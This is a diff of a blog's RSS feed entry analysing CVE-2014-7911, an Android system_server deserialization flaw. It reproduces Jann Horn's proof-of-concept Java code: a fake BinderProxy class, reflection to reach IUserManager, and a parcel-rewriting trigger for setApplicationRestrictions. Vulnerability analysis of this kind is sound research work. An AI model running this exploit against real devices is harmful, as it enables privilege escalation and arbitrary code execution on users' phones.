@@ -18,17 +18,125 @@
       <pubDate>Mon, 29 Feb 2016 16:34:11 +0800</pubDate>
       <author>zeqiii@163.com (zeqi)</author>
       <guid>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</guid>
-      <description>&lt;p&gt;##A brief look
-System_server is a process has &lt;strong&gt;system&lt;/strong&gt; permission, to which one can send any serializable data. Although system_server won&amp;rsquo;t invoke any functions of the received objected, but &lt;strong&gt;finalize&lt;/strong&gt; will be called when&lt;strong&gt;GC&lt;/strong&gt;.
-Function &lt;strong&gt;finalize&lt;/strong&gt; in &lt;strong&gt;android.os.BinderProxy&lt;/strong&gt; calls a native function which has pointers, the pointers may be controlled by attackers. So &lt;strong&gt;GC&lt;/strong&gt; may resulting in arbitrary code execution. &lt;strong&gt;android.os.BinderProxy&lt;/strong&gt; isn&amp;rsquo;t serializable, however, java.io.ObjectInputStream doesn&amp;rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
-One blog says:
-&amp;gt;ObjectInputStream doesn¡¯t validate that the serialized object¡¯s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.&lt;/p&gt;
+      <description>
 
-&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;
-&amp;gt;&lt;a href=&#34;http://seclists.org/fulldisclosure/2014/Nov/51&#34;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;
-&amp;gt;&lt;a href=&#34;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/a&gt;
-&amp;gt;&lt;a href=&#34;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;
-&amp;gt;&lt;a href=&#34;http://drops.wooyun.org/mobile/6082&#34;&gt;http://drops.wooyun.org/mobile/6082&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;a-brief-look:acd576735d79af9c00f02f7cf3030262&#34;&gt;A brief look&lt;/h2&gt;
+
+&lt;p&gt;System_server is a process has &lt;strong&gt;system&lt;/strong&gt; permission, to which one can send any serializable data. Although system_server won&amp;rsquo;t invoke any functions of the received objected, but &lt;strong&gt;finalize&lt;/strong&gt; will be called when&lt;strong&gt;GC&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Function &lt;strong&gt;finalize&lt;/strong&gt; in &lt;strong&gt;android.os.BinderProxy&lt;/strong&gt; calls a native function which has pointers, the pointers may be controlled by attackers. So &lt;strong&gt;GC&lt;/strong&gt; may resulting in arbitrary code execution. &lt;strong&gt;android.os.BinderProxy&lt;/strong&gt; isn&amp;rsquo;t serializable, however, java.io.ObjectInputStream doesn&amp;rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
+As other one&amp;rsquo;s blog says:
+&amp;gt; ObjectInputStream doesn&amp;rsquo;t validate that the serialized object&amp;rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s just see the POC written by &lt;strong&gt;Jann Horn&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;AAdroid.os.BinderProxy.java&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class BinderProxy implements Serializable {
+   private static final long serialVersionUID = 0;
+   //public long mObject = 0x1337beef;
+   //public long mOrgue = 0x1337beef;
+   private int mObject = 0x1337beef;
+   private int mOrgue = 0x1337beef;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Partial code of MainActivity.java&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Put the fake BinderProxy object into a Bundle
+Bundle b = new Bundle();
+AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
+b.putSerializable(&amp;quot;eatthis&amp;quot;, evilProxy);
+
+// Get IUserManager using reflection
+Class clIUserManager = Class.forName(&amp;quot;android.os.IUserManager&amp;quot;);
+// Get inner class Stub from IUserManager
+Class[] umSubclasses = clIUserManager.getDeclaredClasses();
+Class clStub = null;
+for (Class c: umSubclasses) {
+    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub&amp;quot;)) {
+        clStub = c;
+    }
+}
+// Get the field &amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;
+Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;);
+fTRANSACTION_setApplicationRestrictions.setAccessible(true);
+TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);
+
+// Get UserManager
+UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
+// mService is a field of UserManager, its type is IUserManager
+Field fService = UserManager.class.getDeclaredField(&amp;quot;mService&amp;quot;);
+fService.setAccessible(true);
+// Get mService from UserManager
+Object proxy = fService.get(um);
+
+// Get Stub.Proxy from clStub
+Class[] stSubclasses = clStub.getDeclaredClasses();
+clProxy = null;
+for (Class c: stSubclasses) {
+    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub.Proxy&amp;quot;)) {
+        clProxy = c;
+    }
+}
+// Get field mRemote from Proxy
+Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
+fRemote.setAccessible(true);
+mRemote = (IBinder) fRemote.get(proxy);
+UserHandle me = android.os.Process.myUserHandle();
+
+// Triggr it!
+setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Implementation of setApplicationRestrictions&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// This function modifies the Bundle, marshalling it, find &amp;quot;AAdr&amp;quot; and changing it to &amp;quot;andr&amp;quot;, so the class description becomes &amp;quot;android.os.BinderProxy&amp;quot;
+public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
+{ 
+    android.os.Parcel _data = android.os.Parcel.obtain(); 
+    android.os.Parcel _reply = android.os.Parcel.obtain(); 
+    try { 
+        _data.writeInterfaceToken(DESCRIPTOR); 
+        _data.writeString(packageName); 
+        _data.writeInt(1); 
+        restrictions.writeToParcel(_data, 0); 
+        _data.writeInt(userHandle); 
+        byte[] data = _data.marshall(); 
+        for (int i=0; true; i++) { 
+            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) { 
+                data[i] = &#39;a&#39;; 
+                data[i+1] = &#39;n&#39;; 
+                break; 
+            } 
+        } 
+        _data.recycle(); 
+        _data = Parcel.obtain(); 
+        _data.unmarshall(data, 0, data.length); 
+        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
+        _reply.readException(); 
+    } 
+    finally { 
+        _reply.recycle(); 
+        _data.recycle(); 
+    } 
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;references:acd576735d79af9c00f02f7cf3030262&#34;&gt;References&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure/2014/Nov/51&#34;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;
+&lt;a href=&#34;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/a&gt;
+&lt;a href=&#34;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;
+&lt;a href=&#34;http://drops.wooyun.org/mobile/6082&#34;&gt;http://drops.wooyun.org/mobile/6082&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
 </description>
     </item>
     
